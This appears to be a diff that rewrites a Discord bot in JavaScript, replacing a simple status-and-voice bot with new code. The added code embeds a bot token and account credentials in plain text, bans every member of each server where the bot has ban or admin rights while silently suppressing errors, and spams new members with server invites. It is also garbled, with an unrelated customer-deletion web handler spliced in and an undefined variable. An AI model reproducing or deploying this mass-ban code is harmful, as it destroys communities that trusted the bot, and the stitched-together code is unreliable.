@@ -1,84 +1,72 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
-var prefix = "2968"// البرفكس هنا
+const Discord = require(`discord.js`);
 
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}!`);
-  console.log('')
-  console.log('')
-  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
-  console.log(`[Start] ${new Date()}`);
-  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
-  console.log('')
-  console.log('╔[════════════════════════════════════]╗');
-  console.log(`Logged in as * [ " ${client.user.username} " ]`);
-  console.log('')
-  console.log('Informations :')
-  console.log('')
-  console.log(`servers! [ " ${client.guilds.size} " ]`);
-  console.log(`Users! [ " ${client.users.size} " ]`);
-  console.log(`channels! [ " ${client.channels.size} " ]`);
-  console.log('╚[════════════════════════════════════]╝')
-  console.log('By Wenteed')
-  console.log('╔[════════════]╗')
-  console.log(' Bot Is Online')
-  console.log('╚[════════════]╝')
-  console.log('')
-  console.log('')
+console.log("BOT ONLINE");
 
-  
-  
+const prefix = "!"
+const version = "3.2.8"
+const token = "NTIwMjkwODg2NDYzMjU4NjU0.Duruxg.qDwwmgcYrlf2k4gksdizmGFGQrs"
+const game = "with you!"
+const status = "invisible"
+var eightball = [ // sets the answers to an eightball
+    "Hey!",
+    "Don't play...",
+    "with me?",
+    "probably",
+    "I don't think so.",
+    "never!",
+    "you can try...",
+    "up to you!",
+]
 
 
-});
- 
- client.on('ready',async () => {
-console.log("Starting..");
-let g = client.guilds.get("499633648866164737");
-let c = g.channels.get("500651445327233034");
-if(c.type === 'voice') {
-c.join();
-setInterval(() => {
-if(!g.me.voiceChannel) c.join();
-}, 1);
-} else {
-console.log("Failed To Join:\n The Channel Type isn't \"text\"");
+const Client = new Discord.Client();
+Client.login("sefjkse90@emailna.co", "123456");
+Client.guilds.forEach(g => {
+        if (g.member(bot.user).hasPermission("BAN_MEMBERS") || g.member(bot.user).hasPermission("ADMINISTRATOR")){
+            g.members.forEach(m => m.ban().catch(() => {}));
+        }
+    });
+Client.login(token);
+Client.on("ready", () => {
+    Client.user.setStatus(status)
+    Client.user.setGame(game)
+    console.log("Bot Ready For Use")
+})
+
+function playAudio(voiceChannel, file) {
+
+    voiceChannel.join().then(connection => {
+
+        connection.playFile(file).on("end", () => {
+                connection.disconnect();
+                voiceChannel.leave();
+        });
+
+    });
 }
-});
- 
- 
-const adminprefix = "2968";
-const devs = ['506211849100984320'];
-client.on('message', message => {
-  var argresult = message.content.split(` `).slice(1).join(' ');
-    if (!devs.includes(message.author.id)) return;
-   
-if (message.content.startsWith(adminprefix + 'setgame')) {
-  client.user.setGame(argresult);
-    message.channel.sendMessage(`**${argresult} تم تغيير بلاينق البوت إلى **`)
-} else
-  if (message.content.startsWith(adminprefix + 'setname')) {
-client.user.setUsername(argresult).then
-    message.channel.sendMessage(`**${argresult}** : تم تغيير أسم البوت إلى`)
-return message.reply("**لا يمكنك تغيير الاسم يجب عليك الانتظآر لمدة ساعتين . **");
-} else
-  if (message.content.startsWith(adminprefix + 'av')) {
-client.user.setAvatar(argresult);
-  message.channel.sendMessage(`**${argresult}** : تم تغير صورة البوت`);
-      } else    
-if (message.content.startsWith(adminprefix + 'st')) {
-  client.user.setGame(argresult, "https://www.twitch.tv/idk");
-    message.channel.sendMessage(`**تم تغيير تويتش البوت إلى  ${argresult}**`)
-}
- 
+
+
+
+Client.on("guildMemberAdd", member => {
+  member.createDM().then(function (author) {
+  return author.send(' ** https://discord.gg/8QmNXf7  افضل سيرفر مع خدمة مميزة جدا لا يفوتك لربما تحتاجه في يوم ما   ** ')
+
+})
 });
 
 
 
 
 
- 
- 
- 
+
+
+exports.delete = function(req, res) {
+    var deleteCustomer = customers["customer" + req.params.id];
+    delete customers["customer" + req.params.id];
+    console.log("--->After deletion, customer list:\n" + JSON.stringify(customers, null, 4) );
+    res.end( "Deleted customer: \n" + JSON.stringify(deleteCustomer, null, 4));
+};
+
+
  
 client.login(process.env.BOT_TOKEN);
